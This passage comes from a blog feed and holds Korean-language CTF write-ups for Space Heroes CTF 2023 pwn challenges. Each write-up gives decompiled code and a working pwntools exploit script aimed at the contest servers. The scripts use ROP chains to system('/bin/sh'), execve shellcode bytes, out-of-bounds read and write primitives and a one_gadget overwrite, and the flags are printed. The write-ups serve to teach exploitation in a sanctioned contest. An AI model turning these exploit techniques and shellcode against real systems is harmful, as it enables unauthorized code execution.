class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./engine_failure.bin&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;spaceheroes-engine-failure.chals.io&quot;</span>,<span class="number">443</span>,ssl=<span class="literal">True</span>,sni=<span class="string">&quot;spaceheroes-engine-failure.chals.io&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./engine_failure.bin&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = e.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(libc.address + <span class="number">0x2a3e5</span>)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(libc.address + <span class="number">0x29cd6</span>)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shctf&#123;3ng1n3s_0ut_w3_4r3_d00med!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Space Heroes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Space Heroes CTF 2023 - Cardassian Targeting System (oob, shellcode)</title>
      <link href="/230428-superheroesctf2023-Cardassian-Targeting-System/"/>
      <url>/230428-superheroesctf2023-Cardassian-Targeting-System/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1856">https://ctftime.org/event/1856</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; 249 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> selectedOption; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> pageSize; <span class="comment">// [rsp+4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">char</span> *addr; <span class="comment">// [rsp+8h] [rbp-68h] BYREF</span></span><br><span class="line">  __int64 <span class="built_in">array</span>[<span class="number">10</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  print_art();</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  addr = <span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  pageSize = getpagesize();</span><br><span class="line">  posix_memalign(&amp;addr, pageSize, pageSize);    <span class="comment">// pageSize = 4096 0x1000</span></span><br><span class="line">  mprotect(addr, pageSize, <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your name and rank &gt;&gt;&gt; &quot;</span>);</span><br><span class="line">  fgets(addr, <span class="number">64</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome back, %s\n&quot;</span>, addr);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    print_menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;selectedOption);</span><br><span class="line">    getchar();</span><br><span class="line">    performAction(selectedOption, <span class="built_in">array</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>malloc</code>ì„ í†µí•´ ë°˜í™˜ëœ <code>heap</code>ì€ <code>mprotect</code> í•¨ìˆ˜ë¡œ ì¸í•´ ì‹¤í–‰ ê¶Œí•œì´ ì£¼ì–´ì§„ ì˜ì—­ì´ ë˜ì—ˆë‹¤. ì—¬ê¸°ì— ì‰˜ì½”ë“œë¥¼ ë„£ê³  íë¦„ì„ ì—¬ê¸°ë¡œ ì „í™˜ì‹œí‚¤ë©´ ë  ê²ƒ ê°™ë‹¤. </p><p><code>performAction</code> í•¨ìˆ˜ì—ì„œ ëŒ€ë†“ê³  <code>oob read</code>ì™€ <code>oob write</code>ë¥¼ ì°¾ì„ ìˆ˜ ìžˆë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;spaceheroes-cardassian-targeting-system.chals.io&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;spaceheroes-cardassian-targeting-system.chals.io&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./cardassian-targeting-system&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./cardassian-targeting-system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oob_read</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;coordinates: &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oob_write</span>(<span class="params">idx, data</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    pause()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asdf</span>(<span class="params">shellcode</span>):</span><br><span class="line">    p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">asdf(shellcode)</span><br><span class="line"></span><br><span class="line">heap = oob_read(-<span class="number">1</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment"># -3 : ret</span></span><br><span class="line">oob_write(-<span class="number">3</span>, heap)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shctf&#123;cardass1an5_ar3_m3t1culou5_r3c0rd_k33p3rs&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Space Heroes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Space Heroes CTF 2023 - Cardassian Targeting System Mk.2 (oob, one_gadget)</title>
      <link href="/230428-superheroesctf2023-Cardassian-Targeting-System-Mk.2/"/>
      <url>/230428-superheroesctf2023-Cardassian-Targeting-System-Mk.2/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1856">https://ctftime.org/event/1856</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; ? points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Cardassian Targeting System</span></span><br><span class="line"><span class="comment">// main</span></span><br><span class="line">  addr = <span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  pageSize = getpagesize();</span><br><span class="line">  posix_memalign(&amp;addr, pageSize, pageSize);    <span class="comment">// pageSize = 4096 0x1000</span></span><br><span class="line">  mprotect(addr, pageSize, <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your name and rank &gt;&gt;&gt; &quot;</span>);</span><br><span class="line">  fgets(addr, <span class="number">64</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome back, %s\n&quot;</span>, addr);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Cardassian Targeting System Mk.2</span></span><br><span class="line"><span class="comment">// main</span></span><br><span class="line">  addr = <span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your name and rank &gt;&gt;&gt; &quot;</span>);</span><br><span class="line">  fgets(addr, <span class="number">64</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome back, %s\n&quot;</span>, addr);</span><br></pre></td></tr></table></figure><p><a href="https://jiravvit.github.io/230428-superheroesctf2023-Cardassian-Targeting-System/">ì´ì „ ë¬¸ì œ</a>ì™€ ë‹¤ë¥¸ ì ì€ ì‰˜ì½”ë“œë¥¼ ì‹¤í–‰í•  ê³µê°„ë„ ì—†ê³  ê¶Œí•œë„ ì—†ë‹¤ëŠ” ì ì´ë‹¤. ì´ ì™¸ì— <code>oob read</code>, <code>oob write</code>ê°€ ë°œìƒí•œë‹¤ëŠ” ì ì€ ë˜‘ê°™ë‹¤. ìš´ ì¢‹ê²Œë„ ì›ê°€ì ¯ì„ ì´ìš©í•  ìˆ˜ ìžˆì–´ì„œ <code>stack</code>ì— ìžˆëŠ” <code>ret</code>ì— ë„£ì–´ì£¼ë©´ ëœë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./challp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;spaceheroes-cardassian-targeting-system-2.chals.io&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;spaceheroes-cardassian-targeting-system-2.chals.io&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./challp&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = e.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;asdf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">20</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;coordinates:&#x27;</span>)</span><br><span class="line">libc_leak = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>) <span class="comment">#- 0x2384a</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">libc.address = libc_leak - <span class="number">0x1ec6a0</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">one_gadget_remote = <span class="number">0xe6c81</span></span><br><span class="line"><span class="comment"># stack_ret off = -3</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">3</span>))</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(libc.address + one_gadget_remote))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shctf&#123;th3_pah-wraith5_h4ve_judged_y0u_4nd_f0und_you_w0rthy&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Space Heroes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
            <tag> one_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Space Heroes CTF 2023 - Death Star Targeting Computer (ret2win)</title>
      <link href="/230428-superheroesctf2023-Death-Star-Targeting-Computer/"/>
      <url>/230428-superheroesctf2023-Death-Star-Targeting-Computer/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1856">https://ctftime.org/event/1856</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; 245 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *choice; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">void</span> (*v6)(<span class="type">void</span>); <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_terminal();</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">3</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v6();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 &gt; <span class="number">3</span> );</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      print_choice();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;choice);</span><br><span class="line">      <span class="keyword">switch</span> ( (<span class="type">unsigned</span> __int64)choice )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))alderaan;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))yavin_4;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))dantoine;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))tatooine;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))dagobah;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))hoth;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7uLL</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))bespin;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          v6 = (<span class="type">void</span> (*)(<span class="type">void</span>))choice;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Target Coordinates =&gt; %ld\n&quot;</span>, v6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>v6</code>ì— í•¨ìˆ˜í¬ì¸í„°ë¥¼ ë‹´ê³  <code>v5</code>ê°€ 2ì¼ ë•Œ <code>v6</code>ì„ ì¶œë ¥í•´ì¤€ë‹¤. ê·¸ë¦¬ê³  <code>v5</code>ê°€ 3ì¼ ë•Œ <code>v6();</code>ì„ í†µí•´ ì´ ë³€ìˆ˜ì— ì €ìž¥ëœ ì£¼ì†Œë¥¼ ì‹¤í–‰í•œë‹¤. ê°€ìž¥ ì¤‘ìš”í•œ ê²ƒì€ ìž…ë ¥ê°’ì´ <code>v6</code>ì— ì €ìž¥ëœë‹¤ëŠ” ì‚¬ì‹¤ì´ë‹¤. ì´ê²ƒì„ í†µí•´ ì›í•˜ëŠ” ì£¼ì†Œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìžˆë‹¤.</p><p>ë§ˆì¹¨ <code>win()</code> í•¨ìˆ˜ê°€ ìžˆë‹¤.</p><img src="/images/230428-superheroesctf2023-Death-Star-Targeting-Computer/Screenshot 2023-04-28 at 18.25.13.png" width=500/><br><p>ì´ë ‡ê²Œ IDAê°€ ë¹¨ê°„ìƒ‰ìœ¼ë¡œ ë³€ìˆ˜ë¥¼ í‘œì‹œí•˜ë©´ ì–´ì…ˆë¸”ë¦¬ë¥¼ ë³´ë¼ëŠ” ëœ»ì´ë‹¤. ì–´ì…ˆë¸”ë¦¬ë¥¼ ì‚´íŽ´ë³´ë©´ ì•„ëž˜ì™€ ê°™ë‹¤.</p><img src="/images/230428-superheroesctf2023-Death-Star-Targeting-Computer/Screenshot 2023-04-28 at 18.38.38.png" width=300/><br><p>ì–´ì…ˆë¸”ë¦¬ì— ì í˜€ìžˆëŠ” ê²ƒì²˜ëŸ¼ ë³€ìˆ˜ë¥¼ ë§žì¶°ì£¼ë©´ ë˜ëŠ”ë° ì´ëŠ” ë‹¤ë¥¸ í•¨ìˆ˜ë“¤ì„ í†µí•´ì„œ ì‰½ê²Œ ë§žì¶°ì¤„ ìˆ˜ ìžˆë‹¤. ë¬¸ì œ ì œìž‘ìžê°€ ì¹œì ˆí•˜ê²Œ ë‹¤ ë„£ì–´ì£¼ì—ˆë‹¤. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000151B ; __unwind &#123;</span><br><span class="line">.text:000000000000151B                 push    rbp</span><br><span class="line">.text:000000000000151C                 mov     rbp, rsp</span><br><span class="line">.text:000000000000151F                 mov     r14, 4Bh ; &#x27;K&#x27;</span><br><span class="line">.text:0000000000001526                 retn</span><br><span class="line">.text:0000000000001526 _Z9ignore_mev   endp ; sp-analysis failed</span><br><span class="line">.text:0000000000001526</span><br><span class="line">.text:0000000000001527</span><br><span class="line">.text:0000000000001527 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000001527</span><br><span class="line">.text:0000000000001527</span><br><span class="line">.text:0000000000001527 ; void sub_1527()</span><br><span class="line">.text:0000000000001527 sub_1527        proc near</span><br><span class="line">.text:0000000000001527                 mov     r13, 56h ; &#x27;V&#x27;</span><br><span class="line">.text:000000000000152E                 retn</span><br><span class="line">.text:000000000000152E sub_1527        endp</span><br><span class="line">.text:000000000000152E</span><br><span class="line">.text:000000000000152F</span><br><span class="line">.text:000000000000152F ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:000000000000152F</span><br><span class="line">.text:000000000000152F</span><br><span class="line">.text:000000000000152F ; void sub_152F()</span><br><span class="line">.text:000000000000152F sub_152F        proc near</span><br><span class="line">.text:000000000000152F                 mov     r15, 135h</span><br><span class="line">.text:0000000000001536                 retn</span><br><span class="line">.text:0000000000001536 sub_152F        endp</span><br></pre></td></tr></table></figure><p>ë‹¤ë§Œ <code>151B</code> ì£¼ì†Œì— ìžˆëŠ” <code>push rbp</code>ëŠ” ì‹¤í–‰ì‹œí‚¤ë©´ ì•ˆëœë‹¤. </p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;spaceheroes-death-star.chals.io&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;spaceheroes-death-star.chals.io&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./death_star_computer.bin&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./death_star_computer.bin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;=&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>) - <span class="number">0x136B</span></span><br><span class="line">info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(e.address + <span class="number">0x1527</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(e.address + <span class="number">0x152f</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(e.address + <span class="number">0x151F</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(e.address + <span class="number">0x153a</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span 